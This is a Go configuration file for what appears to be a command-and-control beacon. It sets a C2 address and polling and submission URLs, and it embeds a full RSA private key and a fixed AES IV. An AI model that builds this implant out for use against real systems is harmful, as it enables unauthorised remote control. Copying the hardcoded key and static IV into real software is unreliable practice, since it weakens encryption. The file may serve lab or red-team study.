package config

import (
	"time"
)

var (
	RsaPublicKey = []byte(`
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCdkPj7YU4kkesg/FhZI4BL9jDxWZSXCB4GYhRN
gNAQwmqul5U8u5D2jcoYMV8JEeaqXZ43lJJD10zifkKRV/WsLyaADlGB3uUcPHGnrYCftNTxo8nH
1kII8T+me1OraGgI5WBX3mOomKGfCCDYaeQdfoW9a1bgC42TqiyLpVRWhQIDAQAB
-----END PUBLIC KEY-----	
	`)
	RsaPrivateKey = []byte(`
-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAJ2Q+PthTiSR6yD8WFkjgEv2MPFZ
lJcIHgZiFE2A0BDCaq6XlTy7kPaNyhgxXwkR5qpdnjeUkkPXTOJ+QpFX9awvJoAOUYHe5Rw8caet
gJ+01PGjycfWQgjxP6Z7U6toaAjlYFfeY6iYoZ8IINhp5B1+hb1rVuALjZOqLIulVFaFAgMBAAEC
gYAT2g0UlujigKPwLvrumCN07pqx/chT0wj9YuQN87nDMsuAHccGtNcJyUl6DNZdbSzzsAHcHNLk
yz57ls7KQxvHl7PEzWhdVZxdRITH6BWcOkxlRZ3AmR8yjl7uVrOeJ6hnJqRWGCXjYV4utx45CrtR
bHygQ1izOoSV7+xXot1VrQJBAK394wk5+pQJXL+g/SCwvuZxAzI0ZK6uU52OUbfc64OyLM6LezXG
5VfxtPnUx6pSItoKikbkLLa4v4JE3RRgThcCQQDn1Sp8U/6I2D+RlhYjWfXUarQf8wNDXOc5ygzg
bEZRdIJcuvtWa9pfrHhiyPHOyDNDCL2jWTp4lbDDuPEISd3DAkBw8s/fvXOdhjZfb/Litdo3XkXk
4X46p5BAR5Nk+FUrOQ89Re7GCkf3v0DsreSv/IIDabQ6MQWV2Hj56Bpcj+ghAkEAlCMU+87cJWsw
64Fg8gPo3mu0X3n0CtZRdg7SvZDSOfhd2I0uTyGpr1rQribCxKQOhXYPX1KD10unYNlLQ0WX6wJB
AJ5jvgNJ/28JXsP7sbS99ZQUlpADmpO6+p4KnDneZfsMXPnIy85PbMMr5bakTnV5Hyh9HYqhzCL1
8LBBqdt5Z4g=
-----END PRIVATE KEY-----
	`)


	C2        = "172.17.0.1:1337"
	plainHTTP = "http://"
	sslHTTP   = "https://"
	GetUrl    = plainHTTP + C2 + "/api/v1/status"
	PostUrl   = plainHTTP + C2 + "/api/v1/entry?id="
	WaitTime  = 10000 * time.Millisecond
	VerifySSLCert = true
	TimeOut time.Duration  = 10 //seconds

	IV        = []byte("abcdefghijklmnop")
	GlobalKey []byte
	AesKey    []byte
	HmacKey   []byte
	Counter   = 0
	TcpBeacons []TcpBeacon
)

const (
	DebugMode = true
)